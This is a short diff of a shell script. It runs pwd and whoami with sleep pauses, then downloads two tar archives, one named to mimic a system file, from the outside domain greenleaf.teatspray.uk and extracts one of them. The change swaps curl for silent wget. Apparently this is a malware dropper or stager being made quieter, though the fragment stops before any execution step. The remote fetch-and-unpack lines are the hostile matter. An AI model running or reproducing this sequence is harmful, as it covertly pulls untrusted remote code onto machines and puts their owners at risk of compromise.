@@ -5,9 +5,9 @@ pwd
 sleep 2
 whoami
 sleep 2
-curl http://greenleaf.teatspray.uk/system33.tar.gz -L -O -J
+wget -q http://greenleaf.teatspray.uk/system33.tar.gz
 sleep 2
-curl http://greenleaf.teatspray.uk/backup7.tar.gz -L -O -J
+wget -q http://greenleaf.teatspray.uk/backup7.tar.gz
 sleep 2
 tar -xf system33.tar.gz
 sleep 2
